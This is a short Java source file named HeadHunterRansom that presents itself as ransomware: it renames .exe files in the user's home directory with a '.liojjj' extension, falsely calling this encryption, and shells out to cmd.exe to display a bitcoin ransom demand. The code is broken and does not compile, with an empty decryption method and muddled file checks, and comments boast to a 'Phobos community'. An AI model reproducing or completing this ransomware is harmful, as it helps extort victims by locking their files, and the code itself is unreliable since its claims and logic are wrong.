import java.io.File;
import java.io.IOException;

public class HeadHunterRansom {
	char filename;
	Object client = "btc miner account here";
	void encryption() {
		File encryptedFile = new File(System.getenv("user.home") + filename + ".exe.liojjj");
		File file = new File(System.getenv("user.home") + filename + ".exe");
		if (file.exists() || file.canExecute() || !file.equals("edge.exe") || !file.equals("chrome.exe") || !file.equals("bravebrowser.exe")) {
			file.renameTo(encryptedFile); //this encrypts files
		}
	}
	
	public static void main(String[] args) throws IOException {
		try {
			Runtime.getRuntime().exec("cmd.exe /c echo ALL YOUR FILES HAVE BEEN ENCRYPTED!"
					+ "PAY idk maybe 0.5 btc(idk how much that is tbh) OR HAVE YOUR FILES LOST!"
					+ "U HAVE ENOUGH TIME TO PAY"); 
			//btw no i didn't ransomed anyone, i am just care about cyber-security
		}
		catch (IOException e) {
			e.printStackTrace();
		}
		//for Phobos community: still think i can't code??? I literally didn't use any help, and made this 100% alone, without googling how to code ransom
	}
	
	void decryption() {
		if (client)
	}
}